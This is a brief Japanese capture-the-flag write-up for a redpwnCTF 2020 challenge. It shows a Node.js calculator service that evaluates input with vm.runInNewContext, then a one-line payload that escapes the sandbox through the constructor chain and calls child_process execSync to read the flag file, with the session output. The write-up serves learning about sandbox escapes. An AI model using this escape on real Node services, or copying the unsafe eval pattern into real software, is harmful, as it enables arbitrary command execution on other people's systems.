# CaaSiNO

> Who needs regex for sanitization when we have VMs?!?!
> The flag is at /ctf/flag.txt

calculator.jsというファイルが添付されていた。

## solution

添付されているcalculator.jsは以下の通り
```javascript
const vm = require('vm')
const readline = require('readline')

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

process.stdout.write('Welcome to my Calculator-as-a-Service (CaaS)!\n')
process.stdout.write('This calculator lets you use the full power of Javascript for\n')
process.stdout.write('your computations! Try `Math.log(Math.expm1(5) + 1)`\n')
process.stdout.write('Type q to exit.\n')
rl.prompt()
rl.addListener('line', (input) => {
  if (input === 'q') {
    process.exit(0)
  } else {
    try {
      const result = vm.runInNewContext(input)
      process.stdout.write(result + '\n')
    } catch {
      process.stdout.write('An error occurred.\n')
    }
    rl.prompt()
  }
})
```

runInNewContextの結果を表示している。

`runInNewContext vuln`みたいな感じて調べると[それっぽいページ](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)が出てきたので、そこを参考にした。

```
const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt')
```
を入力するとフラグを手に入れることができた

```
$ nc 2020.redpwnc.tf 31273
Welcome to my Calculator-as-a-Service (CaaS)!
This calculator lets you use the full power of Javascript for
your computations! Try `Math.log(Math.expm1(5) + 1)`
Type q to exit.
> const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt')
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```
